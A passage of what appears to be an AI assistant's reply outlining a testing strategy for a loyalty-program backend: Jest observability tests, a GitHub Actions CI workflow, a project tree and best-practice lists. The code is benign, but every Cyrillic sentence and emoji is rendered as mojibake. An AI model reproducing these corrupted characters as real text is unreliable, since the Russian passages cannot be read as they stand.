    expect(response.body).toMatchObject({
      status: 'ok',
      timestamp: expect.any(String),
      uptime: expect.any(Number),
      checks: {
        database: { status: 'up', responseTime: expect.any(Number) },
        redis: { status: 'up', responseTime: expect.any(Number) },
        s3: { status: 'up' },
        telegram: { status: 'up' },
      },
    });

    console.log('‚úÖ Health checks working');
  });

  // Test 3: Structured Logging
  it('should use structured logging', async () => {
    const logger = app.get('Logger');
    const logs: any[] = [];

    // Capture logs
    const originalLog = logger.log;
    logger.log = jest.fn((message, context) => {
      logs.push({ message, context });
      originalLog.call(logger, message, context);
    });

    await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${generateToken()}`)
      .expect(200);

    // Verify structured format
    const logEntry = logs[0];
    expect(logEntry).toMatchObject({
      message: expect.any(String),
      context: expect.objectContaining({
        timestamp: expect.any(String),
        level: expect.any(String),
        requestId: expect.any(String),
      }),
    });

    console.log('‚úÖ Structured logging working');
  });

  // Test 4: Distributed Tracing
  it('should propagate trace context', async () => {
    const traceId = 'test-trace-123';

    const response = await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${generateToken()}`)
      .set('X-Trace-Id', traceId)
      .expect(200);

    // Verify trace ID propagated
    expect(response.headers['x-trace-id']).toBe(traceId);

    console.log('‚úÖ Distributed tracing working');
  });

  // Test 5: Error Tracking (Sentry Integration)
  it('should send errors to Sentry', async () => {
    const Sentry = require('@sentry/node');
    jest.spyOn(Sentry, 'captureException');

    // Trigger error
    await request(app.getHttpServer())
      .get('/api/v1/error-test')
      .expect(500);

    expect(Sentry.captureException).toHaveBeenCalled();

    console.log('‚úÖ Error tracking working');
  });

  // Test 6: Performance Monitoring
  it('should track slow queries', async () => {
    const prisma = app.get(PrismaClient);

    // Enable query logging
    const slowQueries: any[] = [];

    prisma.$on('query', (e: any) => {
      if (e.duration > 1000) {
        // > 1 second
        slowQueries.push(e);
      }
    });

    // Run slow query
    await prisma.$queryRaw`SELECT pg_sleep(2)`;

    expect(slowQueries.length).toBeGreaterThan(0);

    console.log('‚úÖ Slow query detection working');
  });

  // Test 7: Custom Business Metrics
  it('should track business metrics', async () => {
    const metricsService = app.get('MetricsService');

    // Simulate ball earning
    await metricsService.recordBallsEarned(100, 'tenant-1');

    // Get metrics
    const response = await request(app.getHttpServer())
      .get('/metrics')
      .expect(200);

    expect(response.text).toContain('balls_earned_total{tenant="tenant-1"}');

    console.log('‚úÖ Business metrics tracked');
  });

  // Test 8: Alerting Rules
  it('should have alerting rules configured', () => {
    const alertingRules = require('../../config/alerting-rules.yml');

    // Verify critical alerts
    expect(alertingRules).toHaveProperty('groups');

    const criticalAlerts = alertingRules.groups.flatMap(g => g.rules);

    expect(criticalAlerts).toContainEqual(
      expect.objectContaining({
        alert: 'HighErrorRate',
        expr: 'rate(http_requests_total{status=~"5.."}[5m]) > 0.05',
      })
    );

    console.log('‚úÖ Alerting rules configured');
  });
});

function generateToken(): string {
  return jwt.sign(
    { userId: 'user-1', role: 'GUEST', tenantId: 'tenant-1' },
    process.env.JWT_SECRET
  );
}
```


***

## **üöÄ CI/CD INTEGRATION**

```yaml
# .github/workflows/test.yml
name: Test Suite

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main, develop]

jobs:
  unit-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '20'
          cache: 'npm'
      
      - name: Install dependencies
        run: npm ci
      
      - name: Run unit tests
        run: npm run test:unit -- --coverage
      
      - name: Upload coverage
        uses: codecov/codecov-action@v3
        with:
          files: ./coverage/coverage-final.json
          flags: unit

  integration-tests:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:15
        env:
          POSTGRES_PASSWORD: postgres
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
      
      redis:
        image: redis:7
        options: >-
          --health-cmd "redis-cli ping"
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
    
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '20'
      
      - name: Install dependencies
        run: npm ci
      
      - name: Run Prisma migrations
        run: npx prisma migrate deploy
        env:
          DATABASE_URL: postgresql://postgres:postgres@localhost:5432/test
      
      - name: Run integration tests
        run: npm run test:integration
        env:
          DATABASE_URL: postgresql://postgres:postgres@localhost:5432/test
          REDIS_HOST: localhost

  e2e-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
      
      - name: Install dependencies
        run: npm ci
      
      - name: Start application
        run: npm run start:test &
      
      - name: Wait for application
        run: npx wait-on http://localhost:3000/health
      
      - name: Run E2E tests
        run: npm run test:e2e

  security-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Run security tests
        run: npm run test:security
      
      - name: npm audit
        run: npm audit --audit-level=high
      
      - name: Snyk scan
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}

  load-tests:
    runs-on: ubuntu-latest
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    steps:
      - uses: actions/checkout@v3
      
      - name: Run load tests
        run: npm run test:load
      
      - name: Upload load test results
        uses: actions/upload-artifact@v3
        with:
          name: load-test-results
          path: load-test-results/

  coverage-report:
    runs-on: ubuntu-latest
    needs: [unit-tests, integration-tests, e2e-tests]
    steps:
      - uses: actions/checkout@v3
      
      - name: Generate coverage report
        run: npm run test:report
      
      - name: Upload report
        uses: actions/upload-artifact@v3
        with:
          name: coverage-report
          path: reports/coverage-report.json
      
      - name: Comment PR with coverage
        uses: romeovs/lcov-reporter-action@v0.3.1
        with:
          github-token: ${{ secrets.GITHUB_TOKEN }}
          lcov-file: ./coverage/lcov.info
```


***

## **üìÅ –§–ò–ù–ê–õ–¨–ù–ê–Ø –°–¢–†–£–ö–¢–£–†–ê –ü–†–û–ï–ö–¢–ê**

```
max-loyalty/
‚îú‚îÄ‚îÄ apps/
‚îÇ   ‚îî‚îÄ‚îÄ backend/
‚îÇ       ‚îú‚îÄ‚îÄ src/
‚îÇ       ‚îú‚îÄ‚îÄ test/
‚îÇ       ‚îÇ   ‚îú‚îÄ‚îÄ unit/                    # ‚úÖ –í–æ–ø—Ä–æ—Å—ã 1-10
‚îÇ       ‚îÇ   ‚îú‚îÄ‚îÄ integration/             # ‚úÖ –í–æ–ø—Ä–æ—Å—ã 11-20
‚îÇ       ‚îÇ   ‚îú‚îÄ‚îÄ e2e/                     # ‚úÖ –í–æ–ø—Ä–æ—Å—ã 11-15
‚îÇ       ‚îÇ   ‚îú‚îÄ‚îÄ contract/                # ‚úÖ –í–æ–ø—Ä–æ—Å—ã 16-20
‚îÇ       ‚îÇ   ‚îú‚îÄ‚îÄ performance/             # ‚úÖ –í–æ–ø—Ä–æ—Å—ã 21-30
‚îÇ       ‚îÇ   ‚îú‚îÄ‚îÄ security/                # ‚úÖ –í–æ–ø—Ä–æ—Å—ã 31-40
‚îÇ       ‚îÇ   ‚îú‚îÄ‚îÄ observability/           # üéÅ Bonus
‚îÇ       ‚îÇ   ‚îú‚îÄ‚îÄ fixtures/
‚îÇ       ‚îÇ   ‚îú‚îÄ‚îÄ helpers/
‚îÇ       ‚îÇ   ‚îî‚îÄ‚îÄ setup.ts
‚îÇ       ‚îú‚îÄ‚îÄ coverage/
‚îÇ       ‚îú‚îÄ‚îÄ reports/
‚îÇ       ‚îî‚îÄ‚îÄ jest.config.js
‚îú‚îÄ‚îÄ scripts/
‚îÇ   ‚îú‚îÄ‚îÄ generate-coverage-report.ts
‚îÇ   ‚îî‚îÄ‚îÄ check-schema-changes.js
‚îú‚îÄ‚îÄ .github/
‚îÇ   ‚îî‚îÄ‚îÄ workflows/
‚îÇ       ‚îú‚îÄ‚îÄ test.yml
‚îÇ       ‚îî‚îÄ‚îÄ security.yml
‚îî‚îÄ‚îÄ package.json
```


***

## **üèÜ BEST PRACTICES SUMMARY**

### **1. Testing Pyramid**

- **70% Unit Tests** - Fast, isolated, –º–Ω–æ–≥–æ tests
- **20% Integration Tests** - Database, external services
- **10% E2E Tests** - Critical user journeys


### **2. Coverage Targets**

- **Overall**: 80%+
- **Critical Paths**: 90%+
- **Security-sensitive code**: 95%+


### **3. Test Naming Convention**

```typescript
describe('ServiceName', () => {
  describe('methodName', () => {
    it('should do something when condition', () => {
      // Arrange
      // Act
      // Assert
    });
  });
});
```


### **4. Continuous Testing**

- ‚úÖ Pre-commit hooks (lint + unit tests)
- ‚úÖ PR checks (all test suites)
- ‚úÖ Nightly builds (load + security tests)
- ‚úÖ Weekly (dependency scans)


### **5. Performance Budgets**

- API endpoints: p95 < 500ms
- Database queries: p95 < 100ms
- Cache hit rate: > 80%
- Background jobs: throughput > 100/sec


### **6. Security Checklist**

- ‚úÖ No PII in logs
- ‚úÖ All inputs validated
- ‚úÖ Rate limiting on all endpoints
- ‚úÖ Security headers set
- ‚úÖ Dependencies scanned weekly
- ‚úÖ Automated penetration testing

***

## **üìà METRICS DASHBOARD**

–†–µ–∫–æ–º–µ–Ω–¥—É–µ–º—ã–µ –º–µ—Ç—Ä–∏–∫–∏ –¥–ª—è –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞:

```typescript
// Prometheus metrics to track
const metrics = {
  // Business metrics
  'balls_earned_total': 'Total balls earned by tenants',
  'balls_redeemed_total': 'Total balls redeemed',
  'active_guests_count': 'Number of active guests',
  'revenue_generated': 'Revenue from loyalty program',
  
  // Technical metrics
  'http_requests_total': 'Total HTTP requests',
  'http_request_duration_seconds': 'HTTP request latency',
  'db_query_duration_seconds': 'Database query latency',
  'cache_hit_rate': 'Redis cache hit rate',
  'queue_job_duration_seconds': 'Background job processing time',
  'queue_job_failures_total': 'Failed background jobs',
  
  // Security metrics
  'auth_failures_total': 'Failed authentication attempts',
  'rate_limit_exceeded_total': 'Rate limit violations',
  'suspicious_activity_total': 'Potential security threats',
};
```


***

üéâ **–ü–û–ó–î–†–ê–í–õ–Ø–Æ! –£ —Ç–µ–±—è —Ç–µ–ø–µ—Ä—å –µ—Å—Ç—å comprehensive testing strategy –¥–ª—è MAX LOYALTY!**

**–°–ª–µ–¥—É—é—â–∏–µ —à–∞–≥–∏:**

1. Implement tests –ø–æ—Å—Ç–µ–ø–µ–Ω–Ω–æ (–Ω–∞—á–Ω–∏ —Å critical paths)
2. –ù–∞—Å—Ç—Ä–æ–π CI/CD pipeline
3. –ó–∞–ø—É—Å—Ç–∏ –ø–µ—Ä–≤—ã–π coverage report
4. Iterate –Ω–∞ –æ—Å–Ω–æ–≤–µ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤

**–ù—É–∂–Ω–∞ –ø–æ–º–æ—â—å —Å:**

- –ö–æ–Ω–∫—Ä–µ—Ç–Ω–æ–π –∏–º–ø–ª–µ–º–µ–Ω—Ç–∞—Ü–∏–µ–π –∫–∞–∫–æ–≥–æ-—Ç–æ —Ç–µ—Å—Ç–∞?
- –ù–∞—Å—Ç—Ä–æ–π–∫–æ–π CI/CD?
- Debugging failing tests?

